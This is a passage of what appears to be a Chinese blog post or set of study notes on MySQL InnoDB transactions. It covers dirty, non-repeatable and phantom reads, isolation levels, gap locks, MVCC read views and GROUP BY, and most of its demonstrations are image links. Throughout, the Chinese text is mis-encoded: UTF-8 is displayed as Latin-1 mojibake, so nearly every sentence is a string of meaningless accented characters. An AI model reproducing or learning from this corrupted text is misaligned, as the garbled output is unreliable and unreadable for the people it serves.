è„è¯»ï¼ˆè¯»å–æœªæäº¤æ•°æ®ï¼‰</span></h4><p>Aäº‹åŠ¡è¯»å–Bäº‹åŠ¡å°šæœªæäº¤çš„æ•°æ®ï¼Œæ­¤æ—¶å¦‚æœBäº‹åŠ¡å‘ç”Ÿé”™è¯¯å¹¶æ‰§è¡Œå›æ»šæ“ä½œï¼Œé‚£ä¹ˆAäº‹åŠ¡è¯»å–åˆ°çš„æ•°æ®å°±æ˜¯è„æ•°æ®ã€‚å°±å¥½åƒåŸæœ¬çš„æ•°æ®æ¯”è¾ƒå¹²å‡€ã€çº¯ç²¹ï¼Œæ­¤æ—¶ç”±äºBäº‹åŠ¡æ›´æ”¹äº†å®ƒï¼Œè¿™ä¸ªæ•°æ®å˜å¾—ä¸å†çº¯ç²¹ã€‚è¿™ä¸ªæ—¶å€™Aäº‹åŠ¡ç«‹å³è¯»å–äº†è¿™ä¸ªè„æ•°æ®ï¼Œä½†äº‹åŠ¡Bè‰¯å¿ƒå‘ç°ï¼Œåˆç”¨å›æ»šæŠŠæ•°æ®æ¢å¤æˆåŸæ¥å¹²å‡€ã€çº¯ç²¹çš„æ ·å­ï¼Œè€Œäº‹åŠ¡Aå´ä»€ä¹ˆéƒ½ä¸çŸ¥é“ï¼Œæœ€ç»ˆç»“æœå°±æ˜¯äº‹åŠ¡Aè¯»å–äº†æ­¤æ¬¡çš„è„æ•°æ®ï¼Œç§°ä¸ºè„è¯»ã€‚</p><p><img src="/2020/03/23/database/clip_image032.png">Read-committedäº‹åŠ¡éš”ç¦»çº§åˆ«åŠä»¥ä¸Šå¯ä»¥é¿å…</p><p>é€šè¿‡</p><p><img src="/2020/03/23/database/clip_image033.png"></p><p>å¯ä»¥æŸ¥åˆ°äº‹åŠ¡çš„éš”ç¦»çº§åˆ«</p><p>è®¾ç½®äº‹åŠ¡éš”ç¦»çº§åˆ«</p><p><img src="/2020/03/23/database/clip_image035.jpg">è®¾ç½®æˆæœ€ä½çš„äº‹åŠ¡éš”ç¦»çº§åˆ«</p><p>ç„¶åSession1æ“ä½œ</p><p>â€™ <img src="/2020/03/23/database/clip_image037.jpg"></p><p>Session2æ“ä½œ</p><p><img src="/2020/03/23/database/clip_image039.jpg"></p><p>æ­¤æ—¶Session1è¿˜æœªæäº¤</p><p>ç„¶åSession1è¿›è¡Œå›æ»šï¼Œç„¶åå†æŸ¥è¯¢</p><p><img src="/2020/03/23/database/clip_image041.jpg"></p><p>é‡‘é¢å˜æˆ1000.</p><p>ä½†æ˜¯Session2ä»¥900ä½åº•è¿›è¡Œæ“ä½œ</p><p><img src="/2020/03/23/database/clip_image043.jpg"></p><p>å¯¼è‡´é‡‘é¢å˜æˆäº†1100ã€‚</p><p>ä½†æ˜¯åº”è¯¥æœ‰1200çš„ã€‚</p><p>åªéœ€è¦æŠŠäº‹åŠ¡çº§åˆ«è®¾ç½®æˆread commitedä»¥ä¸Šå°±å¯ä»¥äº†</p><p>ç„¶åSession1è¿›è¡Œçº¢æ¡†æ“ä½œ</p><p><img src="/2020/03/23/database/clip_image045.jpg"></p><p>ç„¶åæ­¤æ—¶Session1å¹¶æœªæäº¤ï¼Œç„¶å</p><p>Session2è¿›è¡ŒæŸ¥è¯¢æ“ä½œ</p><p><img src="/2020/03/23/database/clip_image047.jpg"></p><p>æ­¤æ—¶Session2è¯»åˆ°çš„å€¼æ˜¯1100ï¼ˆè¿˜æœªä¿®æ”¹çš„æ•°æ®ï¼‰</p><p>å¯ä»¥é¿å…è„è¯»</p><h4><span id="3-ä¸å¯é‡å¤è¯»ä¸€ä¸ªäº‹åŠ¡èŒƒå›´å†…ä¸¤ä¸ªç›¸åŒçš„æŸ¥è¯¢å´è¿”å›äº†ä¸åŒæ•°æ®">3. ä¸å¯é‡å¤è¯»ï¼ˆä¸€ä¸ªäº‹åŠ¡èŒƒå›´å†…ä¸¤ä¸ªç›¸åŒçš„æŸ¥è¯¢å´è¿”å›äº†ä¸åŒæ•°æ®ï¼‰</span></h4><p>äº‹åŠ¡Aåœ¨æ‰§è¡Œè¯»å–æ“ä½œï¼Œç”±æ•´ä¸ªäº‹åŠ¡Aæ¯”è¾ƒå¤§ï¼Œå‰åè¯»å–åŒä¸€æ¡æ•°æ®éœ€è¦ç»å†å¾ˆé•¿çš„æ—¶é—´ ã€‚è€Œåœ¨äº‹åŠ¡Aç¬¬ä¸€æ¬¡è¯»å–æ•°æ®ï¼Œæ¯”å¦‚æ­¤æ—¶è¯»å–äº†å°æ˜çš„å¹´é¾„ä¸º20å²ï¼Œäº‹åŠ¡Bæ‰§è¡Œæ›´æ”¹æ“ä½œï¼Œå°†å°æ˜çš„å¹´é¾„æ›´æ”¹ä¸º30å²ï¼Œæ­¤æ—¶äº‹åŠ¡Aç¬¬äºŒæ¬¡è¯»å–åˆ°å°æ˜çš„å¹´é¾„æ—¶ï¼Œå‘ç°å…¶å¹´é¾„æ˜¯30å²ï¼Œå’Œä¹‹å‰çš„æ•°æ®ä¸ä¸€æ ·äº†ï¼Œä¹Ÿå°±æ˜¯æ•°æ®ä¸é‡å¤äº†ï¼Œç³»ç»Ÿä¸å¯ä»¥è¯»å–åˆ°é‡å¤çš„æ•°æ®ï¼Œæˆä¸ºä¸å¯é‡å¤è¯»ã€‚</p><p><img src="/2020/03/23/database/clip_image048.png"></p><p>Repeatable-readäº‹åŠ¡éš”ç¦»çº§åˆ«ä»¥ä¸Šå¯ä»¥é¿å…</p><p>Session1ï¼š</p><p><img src="/2020/03/23/database/clip_image049.png"></p><p>Session2ï¼š</p><p><img src="/2020/03/23/database/clip_image051.jpg"></p><p>å­˜å…¥æ•°æ®åå‘ç°å·²ç»ä¸º1600äº†</p><p>æ­¤æ—¶</p><p>Session1è¿›è¡Œè¯»å–æ“ä½œ</p><p><img src="/2020/03/23/database/clip_image053.jpg"></p><p>ç”±äºè®¾ç½®äº†read-committedé¿å…äº†è„è¯»ï¼Œå› æ­¤è¿˜æ˜¯1300</p><p>ç„¶å</p><p>Session2æäº¤ä¿®æ”¹</p><p><img src="/2020/03/23/database/clip_image055.jpg"></p><p>æ­¤æ—¶ï¼ŒSession1å†æ¬¡è¯»å–</p><p>å‘ç°balanceå˜æˆäº†1600</p><p><img src="/2020/03/23/database/clip_image057.jpg"></p><p>è¿™å°±æ˜¯æ‰€è°“çš„ä¸å¯é‡å¤è¯»ï¼Œå³ä¸å¯é‡å¤è¯»ï¼Œæ˜¯æŒ‡åœ¨æ•°æ®åº“è®¿é—®ä¸­ï¼Œä¸€ä¸ª<a href="https://baike.baidu.com/item/%E4%BA%8B%E5%8A%A1">äº‹åŠ¡</a>èŒƒå›´å†…ä¸¤ä¸ªç›¸åŒçš„æŸ¥è¯¢å´è¿”å›äº†ä¸åŒæ•°æ®ã€‚</p><h5><span id="è§£å†³æ–¹æ³•">è§£å†³æ–¹æ³•ï¼š</span></h5><p>å°†äº‹åŠ¡éš”ç¦»çº§åˆ«æ”¹æˆï¼šå¯é‡å¤è¯»</p><p><img src="/2020/03/23/database/clip_image059.jpg"></p><p>ç„¶åæ­¤æ—¶ï¼š</p><p>Session1å’ŒSession2éƒ½å¼€å¯äº‹åŠ¡</p><p>Session1è¯»å–è´¦æˆ·</p><p><img src="/2020/03/23/database/clip_image060.png"></p><p>Session2ï¼šå­˜å…¥400</p><p><img src="/2020/03/23/database/clip_image062.jpg"></p><p>ä½†æ˜¯å¹¶æœªæäº¤</p><p>æ­¤æ—¶</p><p>Session1è¯»å–</p><p><img src="/2020/03/23/database/clip_image064.jpg"></p><p>ç„¶åSession2è¿›è¡Œæäº¤æ“ä½œ</p><p>Commit</p><p>Session1å†æ¬¡è¿›è¡ŒæŸ¥è¯¢æ“ä½œ</p><p><img src="/2020/03/23/database/clip_image066.jpg"></p><p>å³ä½¿æ­¤æ—¶è¯»å–çš„æ˜¯1600ï¼Œä½†æ˜¯å†å»åšæäº¤è¿˜æ˜¯æ­£ç¡®çš„</p><p><img src="/2020/03/23/database/clip_image068.jpg"></p><h4><span id="4-å¹»è¯»å‰åå¤šæ¬¡è¯»å–æ•°æ®æ€»é‡ä¸ä¸€è‡´">4. å¹»è¯»ï¼šï¼ˆå‰åå¤šæ¬¡è¯»å–ï¼Œæ•°æ®æ€»é‡ä¸ä¸€è‡´ï¼‰</span></h4><p><img src="/2020/03/23/database/clip_image069.png"></p><p>Serializableäº‹åŠ¡éš”ç¦»çº§åˆ«å¯é¿å…</p><p>Session1ä½¿ç”¨å½“å‰è¯»è¯»å–æ•´è¡¨æ•°æ®</p><p><img src="/2020/03/23/database/clip_image071.jpg"></p><p>Session2è¿›è¡Œæ’å…¥æ“ä½œ</p><p><img src="/2020/03/23/database/clip_image073.jpg"></p><p>ç„¶åcommit</p><p>ç´§æ¥ç€Session1å¯¹æ‰€æœ‰ä½™é¢è¿›è¡Œæ›´æ–°</p><p><img src="/2020/03/23/database/clip_image074.png"></p><p>ç»“æœå´æ›´æ–°äº†æ–°æ’å…¥çš„æ•°æ®</p><p>äº‹åŠ¡åœ¨æ’å…¥å·²ç»æ£€æŸ¥è¿‡ä¸å­˜åœ¨çš„è®°å½•æ—¶ï¼ŒæƒŠå¥‡çš„å‘ç°è¿™äº›æ•°æ®å·²ç»å­˜åœ¨äº†ï¼Œä¹‹å‰çš„æ£€æµ‹è·å–åˆ°çš„æ•°æ®å¦‚åŒé¬¼å½±ä¸€èˆ¬ã€‚</p><p>æŠŠéš”ç¦»çº§åˆ«æ”¹æˆSerializableåï¼Œæ‰€æœ‰sqlæ“ä½œéƒ½ä¼šåŠ ä¸Šé”ï¼Œå³ä½¿ä¸åŠ ä¸Šlock in share modeï¼›</p><p><img src="/2020/03/23/database/clip_image076.jpg"></p><h3><span id="innodbå¯é‡å¤è¯»éš”ç¦»çº§åˆ«ä¸‹å¦‚ä½•é¿å…å¹»è¯»">InnoDBå¯é‡å¤è¯»éš”ç¦»çº§åˆ«ä¸‹å¦‚ä½•é¿å…å¹»è¯»</span></h3><p>Ã˜ è¡¨è±¡ï¼šå¿«ç…§è¯»ï¼ˆéé˜»å¡è¯»ï¼‰â€“ä¼ªMVCC</p><p>Ã˜ å†…åœ¨ï¼šnext-keyé”ï¼ˆè¡Œé”+gapé”ï¼‰</p><h4><span id="å½“å‰è¯»">å½“å‰è¯»</span></h4><p>Selectâ€¦lock in share modeï¼ˆå…±äº«é”ï¼‰, selectâ€¦for update</p><p>Update, delete, insert</p><p>å…¶ä½™éƒ½æ˜¯åŠ ä¸Šæ’ä»–é”</p><p>è¯»å–çš„æ˜¯è®°å½•çš„æœ€æ–°ç‰ˆæœ¬ï¼Œå¹¶ä¸”è¯»å–åè¿˜éœ€ä¿è¯å…¶ä»–å¹¶å‘äº‹åŠ¡ä¸èƒ½ä¿®æ”¹å½“å‰äº‹åŠ¡ï¼Œå¯¹è¯»å–çš„äº‹åŠ¡åŠ é”ã€‚</p><p><img src="/2020/03/23/database/clip_image078.jpg"></p><h4><span id="å¿«ç…§è¯»">å¿«ç…§è¯»</span></h4><p>ä¸åŠ é”çš„éé˜»å¡è¯»ï¼Œselectï¼ˆä¸åœ¨Serializableçº§åˆ«ä¸‹æ‰æˆç«‹ï¼‰</p><p>åœ¨Serializableä¸‹æ˜¯ä¸²è¡Œè¯»ï¼Œæ‰€ä»¥å¿«ç…§è¯»é€€åŒ–æˆå½“å‰è¯»ã€‚</p><h5><span id="rcçº§åˆ«ä¸‹">RCçº§åˆ«ä¸‹</span></h5><p>Session1ï¼šï¼ˆRCï¼‰</p><p><img src="/2020/03/23/database/clip_image079.png"></p><p>Session2ä¸­</p><p><img src="/2020/03/23/database/clip_image081.jpg"></p><p>åœ¨Session1ä¸­ç”¨å½“å‰è¯»:</p><p><img src="/2020/03/23/database/clip_image083.jpg"></p><p>å¿«ç…§è¯»</p><p><img src="/2020/03/23/database/clip_image084.png"></p><p>å¿«ç…§è¯»å·²ç»ä¸º600</p><p><strong>åœ¨RCä¸‹ï¼Œå¿«ç…§è¯»å’Œå½“å‰è¯»çš„æ•ˆæœæ˜¯ä¸€æ ·çš„</strong></p><h5><span id="åœ¨rrçº§åˆ«ä¸‹">åœ¨RRçº§åˆ«ä¸‹</span></h5><p>åœ¨Session3ä¸­å…ˆä½¿ç”¨å¿«ç…§è¯»</p><p><img src="/2020/03/23/database/clip_image086.jpg"></p><p><img src="/2020/03/23/database/clip_image087.png"></p><p>åœ¨Session4ä¸­å°†ä½™é¢æ”¹æˆ300</p><p><img src="/2020/03/23/database/clip_image089.jpg"></p><p>Session3å½“å‰è¯»ï¼š</p><p><img src="/2020/03/23/database/clip_image091.jpg"></p><p>æ›´æ–°æˆ300</p><p>å¿«ç…§è¯»ï¼š</p><p><img src="/2020/03/23/database/clip_image093.jpg"></p><p>å¿«ç…§è¯»è¿˜æ˜¯600</p><p>æœ‰æ²¡æœ‰å¯èƒ½åœ¨å¿«ç…§è¯»ä¸‹è¯»åˆ°æœ€æ–°çš„æ•°æ®å‘¢ï¼Ÿ å¯ä»¥ï¼</p><p>åœ¨Session3ä¸­å…ˆä¸åšæŸ¥è¯¢ï¼Œå…ˆåœ¨Session4ä¸­å¯¹balanceæ›´æ–°</p><p><img src="/2020/03/23/database/clip_image095.jpg"></p><p>ç„¶ååœ¨Session3ä¸­ä½¿ç”¨å½“å‰è¯»å’Œå¿«ç…§è¯»éƒ½æ˜¯0</p><h4><span id="gapé”">Gapé”</span></h4><p>Gapæ˜¯ç´¢å¼•æ ‘ä¸­æ’å…¥æ•°æ®çš„ç©ºéš™ï¼Œgap locké”å®šä¸€ä¸ªèŒƒå›´ï¼Œä½†æ˜¯ä¸åŒ…æ‹¬æ•°æ®æœ¬èº«ã€‚</p><p>ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢åŒä¸€äº‹åŠ¡çš„ä¸¤æ¬¡å½“å‰è¯»å‡ºç°å¹»è¯»çš„æƒ…å†µã€‚</p><p>åœ¨RRå’ŒSerializableä¸‹éƒ½é»˜è®¤æ”¯æŒGapé”</p><h5><span id="1-ä¸»é”®æˆ–è€…å”¯ä¸€é”®">1. ä¸»é”®æˆ–è€…å”¯ä¸€é”®</span></h5><p>åœ¨RRä¸‹æ— è®ºåˆ æ”¹æŸ¥å½“å‰è¯»è‹¥ç”¨åˆ°ä¸»é”®æˆ–è€…å”¯ä¸€é”®ä¼šç”¨åˆ°gapé”å—ï¼Ÿ</p><p>Ã˜ å¦‚æœwhereæ¡ä»¶å…¨éƒ¨å‘½ä¸­ï¼Œåˆ™ä¸ä¼šç”¨Gapé”ï¼Œåªä¼šåŠ è®°å½•é”</p><p>å…¨éƒ¨å‘½ä¸­å³ç²¾ç¡®æŸ¥è¯¢ï¼Œå…¨éƒ¨æ¡ä»¶éƒ½åœ¨æ•°æ®åº“ä¸­å­˜åœ¨ã€‚</p><p>ç”±äºå…¨éƒ¨å‘½ä¸­ï¼Œä¸ä¼šå‡ºç°å¹»è¯»æƒ…å†µã€‚å°±ä¸éœ€è¦åŠ Gapé”ã€‚ï¼ˆå› ä¸ºæ–°å¢çš„æ•°æ®è‚¯å®šåœ¨whereèŒƒå›´ä¹‹å¤–ï¼Œï¼ˆwhereé‡Œé¢æ˜¯å”¯ä¸€é”®æˆ–è€…ä¸»é”®ï¼‰ï¼‰</p><p><img src="/2020/03/23/database/clip_image096.png"></p><p>ç”±äºidæ˜¯å”¯ä¸€é”®ã€‚å› æ­¤deleteä¼šèµ°idè¿™åˆ—çš„ç´¢å¼•è¿›è¡Œwhereæ¡ä»¶çš„è¿‡æ»¤ã€‚</p><p>åœ¨æ‰¾åˆ°id&#x3D;9çš„è®°å½•ä¼šå°†id&#x3D;9çš„æ•°æ®åŠ ä¸Šè¡Œé”(record lock),ä¼šæ ¹æ®è¯»åˆ°çš„nameä½œä¸ºä¸»é”®ç´¢å¼•ï¼Œå³å¯†é›†ç´¢å¼•ï¼Œç„¶åå°†name&#x3D;då¯¹åº”çš„ä¸»é”®ç´¢å¼•é¡¹ä¹ŸåŠ ä¸Šrecord lockï¼ˆæ’ä»–é”ï¼‰ã€‚</p><p><strong>ä¸ºä»€ä¹ˆå°†ä¸»é”®ç´¢å¼•ä¹ŸåŠ é”å‘¢</strong></p><p>å¦‚æœæ­¤æ—¶æœ‰å…¶ä»–äº‹åŠ¡æ›´æ–°name&#x3D;dçš„idä¸º90ï¼Œç”±äºæ²¡æœ‰é”ï¼Œè¯¥äº‹åŠ¡æ— æ³•æ„ŸçŸ¥æ­¤æ¬¡æ›´æ–°ï¼Œè¿èƒŒäº†åŒä¸€è®°å½•ä¸Šçš„æ›´æ–°æˆ–è€…åˆ é™¤éœ€è¦ä¸²è¡Œæ‰§è¡Œçš„çº¦æŸã€‚</p><p>åˆ›å»ºtbè¡¨</p><p><img src="/2020/03/23/database/clip_image097.png"></p><p>å…¶ä¸­IDä¸º4 ã€7 å’Œ 8çš„æ•°æ®ä¸å­˜åœ¨</p><p><img src="/2020/03/23/database/clip_image098.png"></p><p>æ­¤æ—¶ä¸¤ä¸ªSessionçš„äº‹åŠ¡éš”ç¦»çº§åˆ«å‡ä¸ºRR</p><h6><span id="å…¨éƒ¨å‘½ä¸­">å…¨éƒ¨å‘½ä¸­</span></h6><p>Session1ï¼š</p><p><img src="/2020/03/23/database/clip_image099.png"></p><p>æ€ä¹ˆè¯æ˜æ˜¯èµ°å”¯ä¸€ç´¢å¼•å‘¢ï¼Ÿç”¨explain</p><p><img src="/2020/03/23/database/clip_image101.jpg"></p><p>å¦‚æœæœ‰gapé”çš„è¯9å‘¨å›´çš„é—´éš™å°†è¢«é”èµ·æ¥</p><p>å¦‚æœåœ¨åˆ«çš„äº‹åŠ¡ä¸­åŠ å…¥id&#x3D;10çš„æ•°æ®æ˜¯ä¼šè¢«Blockedä½</p><p>åœ¨Session1æœªæäº¤æ—¶</p><p>Session2ï¼š</p><p><img src="/2020/03/23/database/clip_image102.png"></p><p>æ‰§è¡ŒæˆåŠŸï¼Œå› ä¸ºä¸åŠ gapé”ã€‚</p><p>Ã˜ å¦‚æœwhereæ¡ä»¶éƒ¨åˆ†å‘½ä¸­æˆ–è€…å…¨ä¸å‘½ä¸­ï¼Œåˆ™ä¼šåŠ Gapé”</p><h6><span id="å…¨ä¸å‘½ä¸­">å…¨ä¸å‘½ä¸­</span></h6><p>æˆ‘ä»¬åªéœ€è¦åˆ é™¤ä¸€ä¸ªä¸å­˜åœ¨çš„è®°å½•å³å¯ï¼ˆæˆ‘ä»¬åœ¨Session1åˆ é™¤7ï¼ŒSession2æ’å…¥8è¯•è¯•çœ‹ï¼‰</p><p><strong>åœ¨Session1ï¼š</strong></p><p>åˆ é™¤ä¸å­˜åœ¨çš„å€¼</p><p><img src="/2020/03/23/database/clip_image103.png"></p><p><strong>Session2ï¼š</strong></p><p>æ’å…¥ä¸å­˜åœ¨çš„å€¼</p><p><img src="/2020/03/23/database/clip_image104.png"></p><p>ç„¶åè¢«blocked</p><h6><span id="éƒ¨åˆ†å‘½ä¸­">éƒ¨åˆ†å‘½ä¸­</span></h6><p>Session1ï¼š</p><p><img src="/2020/03/23/database/clip_image105.png"></p><p><img src="/2020/03/23/database/clip_image106.png"></p><p>Session1æœªæäº¤æ—¶</p><p>Session2è¿›è¡Œæ’å…¥æ“ä½œ</p><p><img src="/2020/03/23/database/clip_image107.png"></p><p>æ’å…¥4æˆåŠŸäº†ï¼Œå°äº5çš„æ•°æ®å¹¶æœªåŠ é”</p><p>ï¼ˆæ’å…¥5åˆ°9çš„æ•°æ®ä¼šè¢«é”ä½ï¼‰</p><p>æ’å…¥7çš„æ—¶å€™è¢«blockedä½äº†</p><p>æ’å…¥8ä¹Ÿè¢«é”ä½</p><p>æ’å…¥10å°±æ²¡è¢«é”ä½</p><h6><span id="å¦‚æœå…¨å‘½ä¸­">å¦‚æœå…¨å‘½ä¸­</span></h6><p>Session1</p><p><img src="/2020/03/23/database/clip_image109.jpg"></p><p>æ­¤æ—¶Session2æ’å…¥7å’Œ8å‡æˆåŠŸæ‰§è¡Œï¼ˆä¸åŠ Gapé”ï¼‰</p><p><img src="/2020/03/23/database/clip_image111.jpg"></p><p>GapèŒƒå›´æœ‰é‚£ä¹ˆå¤šï¼Œä½†æ˜¯åªä¼šå¯¹(6,9] (9,11]çš„gapä¸Šé”</p><p>Gapé”é”ä½å·¦å¼€å³é—­çš„åŒºé—´</p><p><img src="/2020/03/23/database/clip_image113.jpg"></p><p>Gapé”æ˜¯ç”¨æ¥é˜²æ­¢æ’å…¥çš„</p><p>å¦‚å›¾ä¼šå¯¹(6-9] (9-11]gapåŒºé—´ä¸Šé”</p><p><strong>ä½†æ˜¯è¿˜è¦è€ƒè™‘ä¸»é”®çš„å€¼æ‰èƒ½æœ€ç»ˆåˆ¤æ–­ã€‚</strong></p><h5><span id="éå”¯ä¸€ç´¢å¼•å’Œä¸èµ°ç´¢å¼•çš„å½“å‰è¯»ä¸‹">éå”¯ä¸€ç´¢å¼•å’Œä¸èµ°ç´¢å¼•çš„å½“å‰è¯»ä¸‹</span></h5><h6><span id="éå”¯ä¸€ç´¢å¼•">éå”¯ä¸€ç´¢å¼•</span></h6><p>åˆ›å»ºè¡¨</p><p><img src="/2020/03/23/database/clip_image114.png"></p><p><strong>å’Œå›¾ä¸­çš„æ¡ˆä¾‹æ˜¯ä¸€è‡´çš„ï¼Œgapé”é”ä½(6,9] (9,11]</strong></p><p><img src="/2020/03/23/database/clip_image115.png"></p><p>Session1ï¼š</p><p><img src="/2020/03/23/database/clip_image116.png"></p><p>Session2ï¼š</p><p><img src="/2020/03/23/database/clip_image117.png"></p><p>éœ€è¦ç­‰å¾…Session1æäº¤æˆ–è€…å›æ»š</p><p>æ­¤æ—¶æ’å…¥5 7 12çš„æƒ…å†µï¼š</p><p>5æˆåŠŸ</p><p>7å¤±è´¥</p><p>12æˆåŠŸ</p><p>ä¸´ç•Œæƒ…å†µ</p><p>æ’å…¥6å’Œ11</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ­¤æ—¶è¡¨é‡Œidä¸º6çš„è¡Œçš„nameçš„å€¼ä¸ºc</p><p><img src="/2020/03/23/database/clip_image118.png"></p><p>æ ¹æ®å­—æ¯è¡¨é¡ºåºb&lt;c&lt;d</p><p><img src="/2020/03/23/database/clip_image119.png"></p><p>æ’å…¥æˆåŠŸ</p><p>æ’å…¥ä¸»é”®ä¸ºddï¼Œidä¸º6çš„å€¼å¤±è´¥</p><p><img src="/2020/03/23/database/clip_image121.jpg"></p><p>ç”±äºä¸»é”®bbæŒ‰å­—æ¯é¡ºåºä¸åœ¨6-11å†…å› æ­¤æ²¡æœ‰è¢«blocked</p><p>ç›¸å ddåœ¨6-11å†…å› æ­¤è¢«blokced</p><h6><span id="ä¸èµ°ç´¢å¼•">ä¸èµ°ç´¢å¼•</span></h6><p><img src="/2020/03/23/database/clip_image122.png"></p><p>æ‰€æœ‰gapå‡è¢«é”ä½</p><p>åˆ›å»ºè¡¨</p><p><img src="/2020/03/23/database/clip_image123.png">c</p><p><img src="/2020/03/23/database/clip_image124.png"></p><p>Session1:</p><p><img src="/2020/03/23/database/clip_image125.png"></p><p>Session2:</p><p><img src="/2020/03/23/database/clip_image127.jpg"></p><h3><span id="rc-rrçº§åˆ«ä¸‹çš„innodbçš„éé˜»å¡è¯»å¦‚ä½•å®ç°">RCã€RRçº§åˆ«ä¸‹çš„InnoDBçš„éé˜»å¡è¯»å¦‚ä½•å®ç°</span></h3><p>Ã˜ æ•°æ®è¡Œé‡Œçš„DB_TRX_IDã€DB_ROLL_PTRã€DB_ROW_IDå­—æ®µ</p><p><em>ç¬¬ä¸€ä¸ªæ˜¯äº‹åŠ¡IDï¼Œç¬¬äºŒä¸ªæ˜¯rollbackæŒ‡é’ˆï¼Œç¬¬ä¸‰ä¸ªæ˜¯è¡Œå·ï¼ˆå¯ä»¥ä½œä¸ºéšè—ä¸»é”®ï¼ˆå¦‚æœæ²¡æœ‰ä¸»é”®å’Œå”¯ä¸€é”®ï¼‰ï¼‰ï¼Œæ­¤å¤–è¿˜æœ‰å…¶ä»–æ ‡å¿—ï¼Œæ¯”å¦‚è¯´åˆ é™¤ä¸€è¡Œæ•°æ®ä¸æ˜¯çœŸçš„å°†å…¶åˆ é™¤ï¼Œè€Œæ˜¯å°†åˆ é™¤çš„æ ‡å¿—ä½æ›´æ”¹ã€‚</em></p><p>Ã˜ Undoæ—¥å¿—</p><p><em>å­˜å‚¨è€ç‰ˆæ•°æ®</em></p><p>Ã˜ Read view</p><p><img src="/2020/03/23/database/clip_image129.jpg"></p><p>åˆ†ä¸ºInsert Undo logå’Œupdate undo log</p><p>Insert Undo logäº‹åŠ¡å¯¹insertäº§ç”Ÿçš„undo logï¼Œåªåœ¨äº‹åŠ¡å›æ»šçš„æ—¶å€™éœ€è¦ï¼Œå¹¶ä¸”åœ¨äº‹åŠ¡æäº¤çš„æ—¶å€™ä¸¢å¼ƒã€‚</p><p>Update undo logï¼Œäº‹åŠ¡deleteå’Œupdateäº§ç”Ÿçš„undo logï¼Œä¸ä»…åœ¨å›æ»šçš„æ—¶å€™éœ€è¦ï¼Œå¿«ç…§è¯»çš„æ—¶å€™ä¹Ÿéœ€è¦æ‰€ä»¥ä¸èƒ½éšä¾¿åˆ é™¤ï¼Œåªæœ‰åœ¨å¿«ç…§ä¸­ä¸æ¶‰åŠè¯¥è®°å½•è¯¥æ—¥å¿—æ‰ä¼šè¢«xxçº¿ç¨‹åˆ é™¤ã€‚</p><p>Read viewä¸»è¦åšå¯è§æ€§åˆ¤æ–­çš„</p><p>å½“æˆ‘ä»¬æ‰§è¡Œå¿«ç…§è¯»Selectçš„æ—¶å€™ï¼Œé’ˆå¯¹æˆ‘ä»¬æŸ¥è¯¢çš„æ•°æ®ï¼Œåˆ›å»ºå‡ºä¸€ä¸ªread viewæ¥å†³å®šå½“å‰äº‹åŠ¡èƒ½çœ‹åˆ°çš„æ˜¯å“ªä¸ªç‰ˆæœ¬çš„æ•°æ®ã€‚Read view éµå¾ªä¸€ä¸ªå¯è§æ€§ç®—æ³•ï¼Œå°†æ•°æ®çš„DB_TRX_IDæ•°æ®å–å‡ºæ¥ä¸ç³»ç»Ÿå…¶å®ƒæ´»è·ƒäº‹åŠ¡idåšå¯¹æ¯”ï¼Œå¦‚æœå¤§äºæˆ–è€…ç­‰äºè¿™äº›idçš„è¯å°±é€šè¿‡db_roll_ptræŒ‡é’ˆå»å–å‡ºundo logä¸Šä¸€å±‚çš„DB_TRX_IDç›´åˆ°å°äºè¿™äº›æ´»è·ƒäº‹åŠ¡idä¸ºæ­¢ã€‚è¿™æ ·å°±ä¿è¯æˆ‘ä»¬è·å–æ•°æ®çš„ç‰ˆæœ¬æ˜¯æœ€ç¨³å®šçš„ç‰ˆæœ¬ã€‚ï¼ˆè¶Šæ–°å¼€å¯çš„äº‹åŠ¡ï¼Œå®ƒçš„IDæ˜¯è¶Šå¤§çš„ï¼‰</p><p>åœ¨RRçº§åˆ«ä¸‹Sessionåœ¨start transactionä¹‹åçš„ç¬¬ä¸€æ¡å¿«ç…§è¯»ååˆ›å»ºä¸€ä¸ªå¿«ç…§å³read viewä¼šå°†å½“å‰ç³»ç»Ÿä¸­æ´»è·ƒçš„äº‹åŠ¡è®°å½•èµ·æ¥ï¼Œæ­¤åè°ƒç”¨å¿«ç…§è¯»çš„è¯è¿˜æ˜¯è°ƒç”¨åŒä¸€ä¸ªread viewã€‚</p><p>åœ¨RCçº§åˆ«ä¸‹ï¼Œäº‹åŠ¡ä¸­æ¯æ¡Selectè¯­å¥æ¯æ¬¡éƒ½ä¼šåˆ›å»ºä¸€æ¬¡æ–°çš„å¿«ç…§</p><p>è¯»å–äº‹åŠ¡æ—¶å€™çš„éé˜»å¡å°±æ˜¯MVCCï¼ˆå¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼‰</p><p>InnoDBçš„éé˜»å¡è¯»æœºåˆ¶æ˜¯ä¼ªMVCCï¼ˆè¯»å†™ä¸å†²çªï¼‰ï¼Œå¹¶æ²¡æœ‰å®ç°å¤šç‰ˆæœ¬å…±å­˜ï¼Œundo logå†…å®¹åªæ˜¯ä¸²è¡ŒåŒ–çš„ç»“æœï¼Œè®°å½•å¤šä¸ªäº‹åŠ¡è¿‡ç¨‹ä¸å±äºå¤šç‰ˆæœ¬å…±å­˜ã€‚</p><h2><span id="å…³é”®è¯­æ³•">å…³é”®è¯­æ³•</span></h2><h4><span id="group-by">GROUP BY</span></h4><p>æ»¡è¶³Selectå­—å¥ä¸­çš„åˆ—åå¿…é¡»ä¸ºåˆ†ç»„åˆ—æˆ–åˆ—å‡½æ•°ï¼ˆåªå¯¹ä¸€å¼ è¡¨æˆç«‹ï¼‰</p><p>åˆ—å‡½æ•°å¯¹äºgroup byå­—å¥å®šä¹‰çš„æ¯ä¸ªç»„å„è¿”å›ä¸€ä¸ªç»“æœ</p><p><img src="/2020/03/23/database/clip_image002-1584950982263.jpg"></p><p><img src="/2020/03/23/database/clip_image004-1584950982263.jpg"></p><p><img src="/2020/03/23/database/clip_image006-1584950982264.jpg"> </p><p><img src="/2020/03/23/database/image-20200323162145595.png"></p><p>æŸ¥è¯¢æ‰€æœ‰åŒå­¦çš„å­¦å·ï¼Œè¯¾ç¨‹æ•°ï¼Œæ€»æˆç»©</p><p><img src="/2020/03/23/database/clip_image009.png"></p><p><img src="/2020/03/23/database/clip_image011.jpg"></p><p>Whereä¸€å®šè¦åœ¨group byå‰é¢</p><h4><span id="having">HAVING</span></h4><p>Ã˜ é€šå¸¸ä¸GROUP BYå­å¥ä¸€èµ·ä½¿ç”¨</p><p>Ã˜ 